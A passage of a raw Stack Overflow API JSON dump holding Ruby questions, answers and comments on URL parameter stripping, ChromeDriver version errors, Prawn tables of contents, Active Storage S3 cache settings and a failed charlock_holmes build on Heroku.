</p>\n\n<p><code>https://www.website.com/colors/blue?gclid=Cj0KCQjwoInnBRDDARIsANBVyASfVUCg4ShKaAq4q8cX6xgB4kYj-oRGEPuO5UuUaAnZi2zD7yQU684aAo3KEALw_wcB&amp;src=camp_id1</code></p>\n\n<p>or </p>\n\n<p><code>https://www.website.com/colors/blue?page=2&amp;gclid=Cj0KCQjwoInnBRDDARIsANBVyASfVUCg4ShKaAq4q8cX6xgB4kYj-oRGEPuO5UuUaAnZi2zD7yQU684aAo3KEALw_wcB&amp;src=camp_id1</code></p>\n\n<p>or </p>\n\n<p><code>https://www.website.com/colors/blue?page=2&amp;src=camp_id1</code></p>\n\n<p>So there are all these variations of the URL.  Sometimes they contain the <code>gclid</code> and sometimes they don't.  They're often at different parts in the url.  </p>\n\n<p>What's the easiest way in ruby to print the string without the <code>gclid</code> substring if it's there?</p>\n"}, {"tags": ["ruby", "selenium-chromedriver", "rbenv"], "owner": {"reputation": 84135, "user_id": 631619, "user_type": "registered", "accept_rate": 68, "profile_image": "https://www.gravatar.com/avatar/b6f3159af5195eddff62a2dd4f9ad969?s=128&d=identicon&r=PG", "display_name": "Michael Durrant", "link": "https://stackoverflow.com/users/631619/michael-durrant"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": false, "view_count": 153, "favorite_count": 0, "answer_count": 0, "score": 1, "last_activity_date": 1558363209, "creation_date": 1558363209, "question_id": 56223233, "link": "https://stackoverflow.com/questions/56223233/unable-to-use-webdriver-with-chromedriver-helper-or-webdrivers-gems", "title": "unable to use webdriver with chromedriver-helper or webdrivers gems", "body": "<p>For ruby 2.6.2</p>\n\n<p>webdriver gem is giving this error:</p>\n\n<pre><code>... connect_until_stable':  \nunable to connect to chromedriver 127.0.0.1:9515 \n(Selenium::WebDriver::Error::WebDriverError)\n</code></pre>\n\n<p>If I switch back to using the (deprecated) <code>chromedriver-helper</code> gem instead of the newer <code>webdrivers</code> gem I get a different error:</p>\n\n<pre><code>session not created:  \nThis version of ChromeDriver only supports Chrome version 75   \n(Selenium::WebDriver::Error::SessionNotCreatedError)\n</code></pre>\n\n<p>even though I have </p>\n\n<pre><code>$ chromedriver -v\nChromeDriver 75.0.3770.8 \n</code></pre>\n\n<p>I've also tried ruby version <code>2.4.0</code>, <code>2.4.1</code>, <code>2.4.2</code>, <code>2.5.0</code>, <code>2.5.1</code>, bundling each time and setting the <code>.ruby-version</code> file within the project and they all seem to have different issues in using the <code>webdrivers</code> or <code>chromedriver-helper</code> gems.\nNote that I am using rbenv and had to do</p>\n\n<pre><code>cd ~/.rbenv/plugins/ruby-build\ngit pull\n</code></pre>\n\n<p>to get make the newer versions available to me locally</p>\n\n<p>I suspect this will resolve soon but right now it's making it hard to find <em>any</em> version combination that actually works today (5/20/2019)</p>\n"}, {"tags": ["ruby", "prawn"], "comments": [{"owner": {"reputation": 30655, "user_id": 138557, "user_type": "registered", "accept_rate": 55, "profile_image": "https://www.gravatar.com/avatar/73c04e9ef9ca435c5b19a2e765ae6d20?s=128&d=identicon&r=PG", "display_name": "Max Williams", "link": "https://stackoverflow.com/users/138557/max-williams"}, "edited": false, "score": 0, "creation_date": 1558365186, "post_id": 56222407, "comment_id": 99068175, "body": "Do the same thing as you would do to generate it at the end, but insert it into the start of the array instead of the end, eg with <code>unshift</code>"}, {"owner": {"reputation": 29, "user_id": 8608205, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/89a86ee89f73c045deacc82a1a55feaf?s=128&d=identicon&r=PG&f=1", "display_name": "underhood", "link": "https://stackoverflow.com/users/8608205/underhood"}, "reply_to_user": {"reputation": 30655, "user_id": 138557, "user_type": "registered", "accept_rate": 55, "profile_image": "https://www.gravatar.com/avatar/73c04e9ef9ca435c5b19a2e765ae6d20?s=128&d=identicon&r=PG", "display_name": "Max Williams", "link": "https://stackoverflow.com/users/138557/max-williams"}, "edited": false, "score": 0, "creation_date": 1558374689, "post_id": 56222407, "comment_id": 99072330, "body": "If i unserstand correctly what you mean it doesn&#39;t solve my problem... i will insert pages (at the beggining) and therefore I do not know page numbers of everything after (as they shifted by unknown number of pages)"}, {"owner": {"reputation": 19244, "user_id": 1978251, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/73f7dd539ad8ec8372af0d06e4f76939?s=128&d=identicon&r=PG", "display_name": "engineersmnky", "link": "https://stackoverflow.com/users/1978251/engineersmnky"}, "edited": false, "score": 0, "creation_date": 1558386023, "post_id": 56222407, "comment_id": 99076470, "body": "<a href=\"http://prawnpdf.org/manual.pdf\" rel=\"nofollow noreferrer\">prawnpdf.org/manual.pdf</a> Page 96 might help"}, {"owner": {"reputation": 29, "user_id": 8608205, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/89a86ee89f73c045deacc82a1a55feaf?s=128&d=identicon&r=PG&f=1", "display_name": "underhood", "link": "https://stackoverflow.com/users/8608205/underhood"}, "edited": false, "score": 0, "creation_date": 1558420852, "post_id": 56222407, "comment_id": 99084129, "body": "Well that I am using already. However that will generate clickable outline in PDF viewer. Not in Document TOC that actually gets printed when you print PDF."}], "owner": {"reputation": 29, "user_id": 8608205, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/89a86ee89f73c045deacc82a1a55feaf?s=128&d=identicon&r=PG&f=1", "display_name": "underhood", "link": "https://stackoverflow.com/users/8608205/underhood"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": false, "view_count": 23, "favorite_count": 0, "answer_count": 0, "score": 0, "last_activity_date": 1558360436, "creation_date": 1558360436, "question_id": 56222407, "link": "https://stackoverflow.com/questions/56222407/how-to-have-in-document-as-document-content-printed-table-of-content-in-beggin", "title": "How to have in document (as document content/printed) table of content in beggining of document", "body": "<p>During generation of document I will store my <em>TOC</em> (Table of Contents) entries... structure looks something like this (hashes stored in array):</p>\n\n<pre><code>[\n {:title =&gt; \"Page Title\" , :page_no =&gt; 15},\n {:title =&gt; \"Page Title 2\" , :page_no =&gt; 22}\n]\n</code></pre>\n\n<p>At the end of document I use it to generate <em>TOC</em>. All worked great until...</p>\n\n<p><strong>Now I have to generate</strong> that same <em>TOC</em> <strong>at the beggining</strong> of document as 2nd page of the document (insert it in beggining behind title page). And this is where I seem to have hit a dead end.</p>\n\n<p>As I do not know how many pages that <em>TOC</em> will have until I have actually generated it I do not know the new page numbers content will have (after being shifted by <em>TOC</em>)...</p>\n\n<p>Any ideas how to handle <em>TOC</em> at the beggining of the document properly?</p>\n"}, {"tags": ["ruby-on-rails", "ruby", "amazon-s3", "rails-activestorage"], "answers": [{"comments": [{"owner": {"reputation": 1958, "user_id": 1858727, "user_type": "registered", "accept_rate": 51, "profile_image": "https://www.gravatar.com/avatar/3affc24909ae07768e44d1cc97d439bd?s=128&d=identicon&r=PG", "display_name": "opensource-developer", "link": "https://stackoverflow.com/users/1858727/opensource-developer"}, "edited": false, "score": 2, "creation_date": 1562248949, "post_id": 56254018, "comment_id": 100326074, "body": "hi @Nicolas Maloeurve, thanks for the answer, can you also share some link to the documentation where we can find more information about what other settings are available and can be set in storage.yml, would be very helpful, Thanks."}, {"owner": {"reputation": 2503, "user_id": 1348593, "user_type": "registered", "accept_rate": 88, "profile_image": "https://www.gravatar.com/avatar/abaf929fee8bb15c2d096c0be90e75e6?s=128&d=identicon&r=PG&f=1", "display_name": "Nicolas Maloeuvre", "link": "https://stackoverflow.com/users/1348593/nicolas-maloeuvre"}, "reply_to_user": {"reputation": 1958, "user_id": 1858727, "user_type": "registered", "accept_rate": 51, "profile_image": "https://www.gravatar.com/avatar/3affc24909ae07768e44d1cc97d439bd?s=128&d=identicon&r=PG", "display_name": "opensource-developer", "link": "https://stackoverflow.com/users/1858727/opensource-developer"}, "edited": false, "score": 0, "creation_date": 1562319614, "post_id": 56254018, "comment_id": 100346111, "body": "@opensource-developer I remember that I had to dig in the Rails repository, and that there is not a lot of documentation about this"}, {"owner": {"reputation": 1958, "user_id": 1858727, "user_type": "registered", "accept_rate": 51, "profile_image": "https://www.gravatar.com/avatar/3affc24909ae07768e44d1cc97d439bd?s=128&d=identicon&r=PG", "display_name": "opensource-developer", "link": "https://stackoverflow.com/users/1858727/opensource-developer"}, "edited": false, "score": 0, "creation_date": 1562320841, "post_id": 56254018, "comment_id": 100346735, "body": "thanks for your reply @Nicolas Maloeuvre, i see an option to change the setting via google cloud platform and apply cache setting to bucket, but not sure, if there is a way to do it programmatically"}, {"owner": {"reputation": 1396, "user_id": 298004, "user_type": "registered", "accept_rate": 80, "profile_image": "https://www.gravatar.com/avatar/32c32ee402bd2daa21ea54a5fb2c60b2?s=128&d=identicon&r=PG", "display_name": "Douglas Lise", "link": "https://stackoverflow.com/users/298004/douglas-lise"}, "edited": false, "score": 2, "creation_date": 1594471447, "post_id": 56254018, "comment_id": 111141023, "body": "I did&#39;n find the official documentation but I found a post that describes how this setting works: <a href=\"https://bitcrowd.dev/caching-with-active-storage\" rel=\"nofollow noreferrer\">bitcrowd.dev/caching-with-active-storage</a>"}], "tags": [], "owner": {"reputation": 2503, "user_id": 1348593, "user_type": "registered", "accept_rate": 88, "profile_image": "https://www.gravatar.com/avatar/abaf929fee8bb15c2d096c0be90e75e6?s=128&d=identicon&r=PG&f=1", "display_name": "Nicolas Maloeuvre", "link": "https://stackoverflow.com/users/1348593/nicolas-maloeuvre"}, "is_accepted": true, "score": 12, "last_activity_date": 1558518606, "creation_date": 1558518606, "answer_id": 56254018, "question_id": 56222167, "link": "https://stackoverflow.com/questions/56222167/how-to-set-a-cache-control-for-s3-files-uploaded-through-active-storage/56254018#56254018", "title": "How to set a cache control for S3 files uploaded through Active Storage?", "body": "<p>in <code>storage.yml</code>, add an <code>upload:</code> config :</p>\n\n<pre><code>amazon:\n  service: S3\n  upload:\n    cache_control: 'private, max-age=31536000'\n</code></pre>\n"}], "owner": {"reputation": 2503, "user_id": 1348593, "user_type": "registered", "accept_rate": 88, "profile_image": "https://www.gravatar.com/avatar/abaf929fee8bb15c2d096c0be90e75e6?s=128&d=identicon&r=PG&f=1", "display_name": "Nicolas Maloeuvre", "link": "https://stackoverflow.com/users/1348593/nicolas-maloeuvre"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 1039, "favorite_count": 1, "accepted_answer_id": 56254018, "answer_count": 1, "score": 5, "last_activity_date": 1558518606, "creation_date": 1558359599, "question_id": 56222167, "link": "https://stackoverflow.com/questions/56222167/how-to-set-a-cache-control-for-s3-files-uploaded-through-active-storage", "title": "How to set a cache control for S3 files uploaded through Active Storage?", "body": "<p>I want to set a cache-control to files uploaded to S3 through Active Storage.</p>\n\n<p>There is this line in the rails repo (<a href=\"https://github.com/rails/rails/blob/master/activestorage/lib/active_storage/service/s3_service.rb\" rel=\"noreferrer\">link here</a>) :</p>\n\n<pre><code>object_for(key).put(body: io, content_md5: checksum, content_type: content_type, **upload_options)\n</code></pre>\n\n<p>So i know that if there is the <code>:cache_control</code> key in **upload_options it could work. (link to aws reference <a href=\"https://docs.aws.amazon.com/sdkforruby/api/Aws/S3/Object.html#put-instance_method\" rel=\"noreferrer\">here</a>)</p>\n\n<p>How to properly set something in upload_options?</p>\n"}, {"tags": ["ruby", "selenium-webdriver", "webdriver", "selenium-chromedriver"], "answers": [{"tags": [], "owner": {"reputation": 84135, "user_id": 631619, "user_type": "registered", "accept_rate": 68, "profile_image": "https://www.gravatar.com/avatar/b6f3159af5195eddff62a2dd4f9ad969?s=128&d=identicon&r=PG", "display_name": "Michael Durrant", "link": "https://stackoverflow.com/users/631619/michael-durrant"}, "is_accepted": false, "score": 1, "last_activity_date": 1558363649, "last_edit_date": 1558363649, "creation_date": 1558358058, "answer_id": 56221753, "question_id": 56221369, "link": "https://stackoverflow.com/questions/56221369/this-version-of-chromedriver-only-supports-chrome-version-75-but-i-do-have-chrom/56221753#56221753", "title": "This version of ChromeDriver only supports Chrome version 75 but I do have chromedriver 75 (webdriver)", "body": "<p>Update: <em>did not work on another machine with ruby 2.6.2  I don't know why yet</em></p>\n\n<p>Not a good answer as it doesn't fix the problem, but:</p>\n\n<blockquote>\n  <p>with with a newer version of ruby - 2.6.2 the browser works correctly.</p>\n</blockquote>\n\n<p>So for now at least 2.6.2 works. (actually my capybara form filling stop working but I will look into that separately)</p>\n\n<p>I've encountered other problems with Ruby 2.6.2 not being available in all places but that will probably change soon.</p>\n"}], "owner": {"reputation": 84135, "user_id": 631619, "user_type": "registered", "accept_rate": 68, "profile_image": "https://www.gravatar.com/avatar/b6f3159af5195eddff62a2dd4f9ad969?s=128&d=identicon&r=PG", "display_name": "Michael Durrant", "link": "https://stackoverflow.com/users/631619/michael-durrant"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 1116, "favorite_count": 0, "answer_count": 1, "score": 0, "last_activity_date": 1558363801, "creation_date": 1558356540, "last_edit_date": 1558363801, "question_id": 56221369, "link": "https://stackoverflow.com/questions/56221369/this-version-of-chromedriver-only-supports-chrome-version-75-but-i-do-have-chrom", "title": "This version of ChromeDriver only supports Chrome version 75 but I do have chromedriver 75 (webdriver)", "body": "<p>ubuntu 18.04 just started getting this when using webdriver through ruby (ruby v2.4.0).</p>\n\n<p>This version of ChromeDriver only supports Chrome version 75 </p>\n\n<p>but </p>\n\n<p><code>\n$ chromedriver -v\nChromeDriver 75.0.3770.8\n(681f24ea911fe754973dda2fdc6d2a2e159dd300-refs/branch-heads/3770@{#40})</code></p>\n\n<p>This is happening with both the <code>chromedriver-helper</code> gem (deprecated) and the replacement <code>webdrivers</code> gem both of which show they are <code>Using selenium-webdriver 2.53.3</code></p>\n\n<p>Moving up Ruby version from 2.4.0 to 2.4.1 gave a different error:</p>\n\n<pre><code>WARN: Clearing out unresolved specs.\nPlease report a bug if this causes problems.\nTraceback (most recent call last):\n    11: from app.rb:71:in `&lt;main&gt;'\n    10: from /home/michael/.rbenv/versions/2.5.0/lib/ruby/gems/2.5.0/gems/capybara-2.3.0/lib/capybara/session.rb:223:in `visit'\n     9: from /home/michael/.rbenv/versions/2.5.0/lib/ruby/gems/2.5.0/gems/capybara-2.3.0/lib/capybara/selenium/driver.rb:45:in `visit'\n     8: from /home/michael/.rbenv/versions/2.5.0/lib/ruby/gems/2.5.0/gems/capybara-2.3.0/lib/capybara/selenium/driver.rb:13:in `browser'\n     7: from /home/michael/.rbenv/versions/2.5.0/lib/ruby/gems/2.5.0/gems/selenium-webdriver-2.53.3/lib/selenium/webdriver.rb:84:in `for'\n     6: from /home/michael/.rbenv/versions/2.5.0/lib/ruby/gems/2.5.0/gems/selenium-webdriver-2.53.3/lib/selenium/webdriver/common/driver.rb:64:in `for'\n     5: from /home/michael/.rbenv/versions/2.5.0/lib/ruby/gems/2.5.0/gems/selenium-webdriver-2.53.3/lib/selenium/webdriver/common/driver.rb:64:in `new'\n     4: from /home/michael/.rbenv/versions/2.5.0/lib/ruby/gems/2.5.0/gems/selenium-webdriver-2.53.3/lib/selenium/webdriver/chrome/bridge.rb:34:in `initialize'\n     3: from /home/michael/.rbenv/versions/2.5.0/lib/ruby/gems/2.5.0/gems/selenium-webdriver-2.53.3/lib/selenium/webdriver/chrome/service.rb:67:in `start'\n     2: from /home/michael/.rbenv/versions/2.5.0/lib/ruby/gems/2.5.0/gems/selenium-webdriver-2.53.3/lib/selenium/webdriver/common/socket_lock.rb:43:in `locked'\n     1: from /home/michael/.rbenv/versions/2.5.0/lib/ruby/gems/2.5.0/gems/selenium-webdriver-2.53.3/lib/selenium/webdriver/chrome/service.rb:70:in `block in start'\n/home/michael/.rbenv/versions/2.5.0/lib/ruby/gems/2.5.0/gems/selenium-webdriver-2.53.3/lib/selenium/webdriver/chrome/service.rb:115:in `connect_until_stable': unable to connect to chromedriver 127.0.0.1:9515 (Selenium::WebDriver::Error::WebDriverError)\n</code></pre>\n\n<p>Trying ruby 2.6.2 gave a different error</p>\n\n<p>session not created: This version of ChromeDriver only supports Chrome version 75 (Selenium::WebDriver::Error::SessionNotCreatedError)</p>\n\n<p>even though</p>\n\n<pre><code>$ chromedriver -v\nChromeDriver 75.0.3770.8 \n(681f24ea911fe754973dda2fdc6d2a2e159dd300-refs/branch-heads/3770@{#40})\n</code></pre>\n"}, {"tags": ["ruby-on-rails", "ruby", "heroku", "rubygems"], "comments": [{"owner": {"reputation": 19244, "user_id": 1978251, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/73f7dd539ad8ec8372af0d06e4f76939?s=128&d=identicon&r=PG", "display_name": "engineersmnky", "link": "https://stackoverflow.com/users/1978251/engineersmnky"}, "edited": false, "score": 0, "creation_date": 1558375438, "post_id": 56221205, "comment_id": 99072623, "body": "Have you looked at <a href=\"https://github.com/brianmario/charlock_holmes#installing\" rel=\"nofollow noreferrer\">this part of the docs</a> where it says <i>&quot;If the traditional <code>gem install charlock_holmes</code> doesn&#39;t work, you may need to specify the path to your installation of ICU using the <code>--with-icu-dir</code> option during the gem install or by configuring Bundler to pass those arguments to Gem&quot;</i>"}], "owner": {"reputation": 1418, "user_id": 1785316, "user_type": "registered", "accept_rate": 35, "profile_image": "https://i.stack.imgur.com/PNOCx.jpg?s=128&g=1", "display_name": "F4Ke", "link": "https://stackoverflow.com/users/1785316/f4ke"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": false, "view_count": 137, "favorite_count": 0, "answer_count": 0, "score": 1, "last_activity_date": 1558355862, "creation_date": 1558355862, "last_edit_date": 1592644375, "question_id": 56221205, "link": "https://stackoverflow.com/questions/56221205/heroku-rails-cant-deploy-after-trying-to-reduce-slug-size-cant-build-cha", "title": "Heroku &amp; rails : can&#39;t deploy after trying to reduce slug size - can&#39;t build charlock_holmes", "body": "<p>The slug size of the Rails app on heroku started to become too heavy, so I attempted to reduce it using theses 2 commands :</p>\n<pre><code>heroku repo:gc --app your-app-name \nheroku repo:purge_cache --app your-app-name\n</code></pre>\n<p>the following deployment I get this error :</p>\n<pre><code>remote:        An error occurred while installing charlock_holmes (0.7.6), and Bundler cannot\nremote:        continue.\nremote:        Make sure that `gem install charlock_holmes -v '0.7.6'` succeeds before\nremote:        bundling.\nremote:\nremote:        In Gemfile:\nremote:          charlock_holmes\nremote:\nremote:  !\nremote:  !     Failed to install gems via Bundler.\nremote:  !\nremote:  !     Push rejected, failed to compile Ruby app.\nremote:\nremote:  !     Push failed\nremote: Verifying deploy...\nremote:\nremote: !   Push rejected to app-name.\nremote:\n</code></pre>\n<p>complete trace :</p>\n<pre><code>remote:        Gem::Ext::BuildError: ERROR: Failed to build gem native extension.\nremote:\nremote:        current directory:\nremote:        /tmp/build_7a7e1aff2dd1ed9791db1eba7f656cba/vendor/bundle/ruby/2.5.0/gems/charlock_holmes-0.7.6/ext/charlock_holmes\nremote:        /tmp/build_7a7e1aff2dd1ed9791db1eba7f656cba/vendor/ruby-2.5.1/bin/ruby -r\nremote:        ./siteconf20190520-506-kmncq3.rb extconf.rb\nremote:        checking for -licui18n... yes\nremote:        checking for -licui18n... yes\nremote:        checking for unicode/ucnv.h... yes\nremote:        checking for -lz... yes\nremote:        checking for -licuuc... yes\nremote:        checking for -licudata... yes\nremote:        creating Makefile\nremote:\nremote:        current directory:\nremote:        /tmp/build_7a7e1aff2dd1ed9791db1eba7f656cba/vendor/bundle/ruby/2.5.0/gems/charlock_holmes-0.7.6/ext/charlock_holmes\nremote:        make &quot;DESTDIR=&quot; clean\nremote:\nremote:        current directory:\nremote:        /tmp/build_7a7e1aff2dd1ed9791db1eba7f656cba/vendor/bundle/ruby/2.5.0/gems/charlock_holmes-0.7.6/ext/charlock_holmes\nremote:        make &quot;DESTDIR=&quot;\nremote:        compiling converter.c\nremote:        compiling encoding_detector.c\nremote:        compiling ext.c\nremote:        compiling transliterator.cpp\nremote:        cc1plus: warning: command line option \u2018-Wimplicit-int\u2019 is valid for C/ObjC but\nremote:        not for C++\nremote:        cc1plus: warning: command line option \u2018-Wdeclaration-after-statement\u2019 is valid\nremote:        for C/ObjC but not for C++\nremote:        cc1plus: warning: command line option \u2018-Wimplicit-function-declaration\u2019 is valid\nremote:        for C/ObjC but not for C++\nremote:        cc1plus: warning: unrecognized command line option \u2018-Wno-self-assign\u2019\nremote:        cc1plus: warning: unrecognized command line option\nremote:        \u2018-Wno-constant-logical-operand\u2019\nremote:        cc1plus: warning: unrecognized command line option \u2018-Wno-parentheses-equality\u2019\nremote:        linking shared-object charlock_holmes/charlock_holmes.so\nremote:        /usr/bin/ld:\nremote:        /tmp/build_7a7e1aff2dd1ed9791db1eba7f656cba/.apt/usr/lib/x86_64-linux-gnu/libicui18n.a(smpdtfmt.ao):\nremote:        relocation R_X86_64_PC32 against symbol `_ZTIN6icu_6013DecimalFormatE' can not\nremote:        be used when making a shared object; recompile with -fPIC\nremote:        /usr/bin/ld: final link failed: Bad value\nremote:        collect2: error: ld returned 1 exit status\nremote:        Makefile:257: recipe for target 'charlock_holmes.so' failed\nremote:        make: *** [charlock_holmes.so] Error 1\nremote:\nremote:        make failed, exit code 2\nremote:\nremote:        Gem files will remain installed in\nremote:        /tmp/build_7a7e1aff2dd1ed9791db1eba7f656cba/vendor/bundle/ruby/2.5.0/gems/charlock_holmes-0.7.6\nremote:        for inspection.\nremote:        Results logged to\nremote:        /tmp/build_7a7e1aff2dd1ed9791db1eba7f656cba/vendor/bundle/ruby/2.5.0/extensions/x86_64-linux/2.5.0/charlock_holmes-0.7.6/gem_make.out\nremote:\nremote:        An error occurred while installing charlock_holmes (0.7.6), and Bundler cannot\nremote:        continue.\nremote:        Make sure that `gem install charlock_holmes -v '0.7.6'` succeeds before\nremote:        bundling.\nremote:\nremote:        In Gemfile:\nremote:          charlock_holmes\nremote:\nremote:  !\nremote:  !     Failed to install gems via Bundler.\nremote:  !\nremote:  !     Push rejected, failed to compile Ruby app.\nremote:\nremote:  !     Push failed\nremote: Verifying deploy...\nremote:\nremote: !   Push rejected to app-name.\nremote:\n</code></pre>\n<p>If I try to install the <code>charlock_holmes</code> gem from the bash terminal, I get :</p>\n<blockquote>\n<p>gem install charlock_holmes -v '0.7.6'</p>\n</blockquote>\n<pre><code>Fetching: charlock_holmes-0.7.6.gem (100%)\nBuilding native extensions. This could take a while...\nERROR:  Error installing charlock_holmes:\n    ERROR: Failed to build gem native extension.\n\n    current directory: /app/vendor/ruby-2.5.1/lib/ruby/gems/2.5.0/gems/charlock_holmes-0.7.6/ext/charlock_holmes\n/app/vendor/ruby-2.5.1/bin/ruby -r ./siteconf20190520-7-dzkpmo.rb extconf.rb\nchecking for -licui18n... *** extconf.rb failed ***\nCould not create Makefile due to some reason, probably lack of necessary\nlibraries and/or headers.  Check the mkmf.log file for more details.  You may\nneed configuration options.\n\nProvided configuration options:\n    --with-opt-dir\n    --without-opt-dir\n    --with-opt-include\n    --without-opt-include=${opt-dir}/include\n    --with-opt-lib\n    --without-opt-lib=${opt-dir}/lib\n    --with-make-prog\n    --without-make-prog\n    --srcdir=.\n    --curdir\n    --ruby=/app/vendor/ruby-2.5.1/bin/$(RUBY_BASE_NAME)\n    --with-icu-dir\n    --without-icu-dir\n    --with-icu-include\n    --without-icu-include=${icu-dir}/include\n    --with-icu-lib\n    --without-icu-lib=${icu-dir}/lib\n    --with-icui18nlib\n    --without-icui18nlib\n/app/vendor/ruby-2.5.1/lib/ruby/2.5.0/mkmf.rb:456:in `try_do': The compiler failed to generate an executable file. (RuntimeError)\nYou have to install development tools first.\n    from /app/vendor/ruby-2.5.1/lib/ruby/2.5.0/mkmf.rb:541:in `try_link0'\n    from /app/vendor/ruby-2.5.1/lib/ruby/2.5.0/mkmf.rb:559:in `try_link'\n    from /app/vendor/ruby-2.5.1/lib/ruby/2.5.0/mkmf.rb:777:in `try_func'\n    from /app/vendor/ruby-2.5.1/lib/ruby/2.5.0/mkmf.rb:1004:in `block in have_library'\n    from /app/vendor/ruby-2.5.1/lib/ruby/2.5.0/mkmf.rb:947:in `block in checking_for'\n    from /app/vendor/ruby-2.5.1/lib/ruby/2.5.0/mkmf.rb:350:in `block (2 levels) in postpone'\n    from /app/vendor/ruby-2.5.1/lib/ruby/2.5.0/mkmf.rb:320:in `open'\n    from /app/vendor/ruby-2.5.1/lib/ruby/2.5.0/mkmf.rb:350:in `block in postpone'\n    from /app/vendor/ruby-2.5.1/lib/ruby/2.5.0/mkmf.rb:320:in `open'\n    from /app/vendor/ruby-2.5.1/lib/ruby/2.5.0/mkmf.rb:346:in `postpone'\n    from /app/vendor/ruby-2.5.1/lib/ruby/2.5.0/mkmf.rb:946:in `checking_for'\n    from /app/vendor/ruby-2.5.1/lib/ruby/2.5.0/mkmf.rb:999:in `have_library'\n    from extconf.rb:31:in `&lt;main&gt;'\n\nTo see why this extension failed to compile, please check the mkmf.log which can be found here:\n\n  /app/vendor/ruby-2.5.1/lib/ruby/gems/2.5.0/extensions/x86_64-linux/2.5.0/charlock_holmes-0.7.6/mkmf.log\n\nextconf failed, exit code 1\n\nGem files will remain installed in /app/vendor/ruby-2.5.1/lib/ruby/gems/2.5.0/gems/charlock_holmes-0.7.6 for inspection.\nResults logged to /app/vendor/ruby-2.5.1/lib/ruby/gems/2.5.0/extensions/x86_64-linux/2.5.0/charlock_holmes-0.7.6/gem_make.out\n</code></pre>\n<p>If I show the output of the <code>.../charlock_holmes-0.7.6/mkmf.log</code> file, this is showing :</p>\n<pre><code>&quot;gcc -o conftest -I/app/vendor/ruby-2.5.1/include/ruby-2.5.0/x86_64-linux -I/app/vendor/ruby-2.5.1/include/ruby-2.5.0/ruby/backward -I/app/vendor/ruby-2.5.1/include/ruby-2.5.0 -I.    -O3 -g -Wall -Wextra -Wno-unused-parameter -Wno-parentheses -Wno-long-long -Wno-missing-field-initializers -Wno-tautological-compare -Wno-parentheses-equality -Wno-constant-logical-operand -Wno-self-assign -Wunused-variable -Wimplicit-int -Wpointer-arith -Wwrite-strings -Wdeclaration-after-statement -Wimplicit-function-declaration -Wdeprecated-declarations -Wmisleading-indentation -Wno-packed-bitfield-compat -Wsuggest-attribute=noreturn -Wsuggest-attribute=format -Wimplicit-fallthrough=0 -Wduplicated-cond -Wrestrict  -fPIC conftest.c  -L. -L/app/vendor/ruby-2.5.1/lib -Wl,-rpath,/app/vendor/ruby-2.5.1/lib -L. -fstack-protector -rdynamic -Wl,-export-dynamic     -Wl,-rpath,'/../lib' -Wl,-rpath,'/../lib' -lruby  -lpthread -lgmp -ldl -lcrypt -lm   -lc&quot;\nIn file included from /app/vendor/ruby-2.5.1/include/ruby-2.5.0/ruby/ruby.h:29:0,\n                 from /app/vendor/ruby-2.5.1/include/ruby-2.5.0/ruby.h:33,\n                 from conftest.c:1:\n/app/vendor/ruby-2.5.1/include/ruby-2.5.0/ruby/defines.h:112:10: fatal error: stdio.h: No such file or directory\n #include &lt;stdio.h&gt;\n          ^~~~~~~~~\ncompilation terminated.\nchecked program was:\n/* begin */\n1: #include &quot;ruby.h&quot;\n2:\n3: int main(int argc, char **argv)\n4: {\n5:   return 0;\n6: }\n/* end */\n</code></pre>\n<p>On heroku I have theses buildpacks</p>\n<blockquote>\n<p>=== my_app Buildpack URLs</p>\n<ol>\n<li><p><a href=\"https://github.com/heroku/heroku-buildpack-apt\" rel=\"nofollow noreferrer\">https://github.com/heroku/heroku-buildpack-apt</a></p>\n</li>\n<li><p>heroku/ruby</p>\n</li>\n</ol>\n</blockquote>\n<p>and my <code>Aptfile</code> is :</p>\n<pre><code>libicu52 \nlibicu-dev\n</code></pre>\n<p>Any Ideas ?</p>\n<p>Thanks in advance !</p>\n"}, {"tags": ["ruby", "capybara"], "comments": [{"owner": {"reputation": 42014, "user_id": 2709090, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/238c2b7cde2c817fc9a5a2b8eaa2ffad?s=128&d=identicon&r=PG&f=1", "display_name": "Thomas Walpole", "link": "https://stackoverflow.com/users/2709090/thomas-walpole"}, "edited": false, "score": 0, "creation_date": 1558360127, "post_id": 56220898, "comment_id": 99065157, "body": "webdrivers 2.4 is over two years old - upgrade to a more current release"}, {"owner": {"reputation": 84135, "user_id": 631619, "user_type": "registered", "accept_rate": 68, "profile_image": "https://www.gravatar.com/avatar/b6f3159af5195eddff62a2dd4f9ad969?s=128&d=identicon&r=PG", "display_name": "Michael Durrant", "link": "https://stackoverflow.com/users/631619/michael-durrant"}, "reply_to_user": {"reputation": 42014, "user_id": 2709090, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/238c2b7cde2c817fc9a5a2b8eaa2ffad?s=128&d=identicon&r=PG&f=1", "display_name": "Thomas Walpole", "link": "https://stackoverflow.com/users/2709090/thomas-walpole"}, "edited": false, "score": 0, "creation_date": 1558370566, "post_id": 56220898, "comment_id": 99070702, "body": "good idea. I wonder why i am picking up the older version when I didn&#39;t specifiy version (which i now changed). is this something about how this gem is set up?  I bundle daily at least when working"}, {"owner": {"reputation": 84135, "user_id": 631619, "user_type": "registered", "accept_rate": 68, "profile_image": "https://www.gravatar.com/avatar/b6f3159af5195eddff62a2dd4f9ad969?s=128&d=identicon&r=PG", "display_name": "Michael Durrant", "link": "https://stackoverflow.com/users/631619/michael-durrant"}, "reply_to_user": {"reputation": 42014, "user_id": 2709090, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/238c2b7cde2c817fc9a5a2b8eaa2ffad?s=128&d=identicon&r=PG&f=1", "display_name": "Thomas Walpole", "link": "https://stackoverflow.com/users/2709090/thomas-walpole"}, "edited": false, "score": 0, "creation_date": 1558370600, "post_id": 56220898, "comment_id": 99070717, "body": "or do major gem version updates (like major version number NOT get picked up once I have an existing lock file or something perhaps?"}, {"owner": 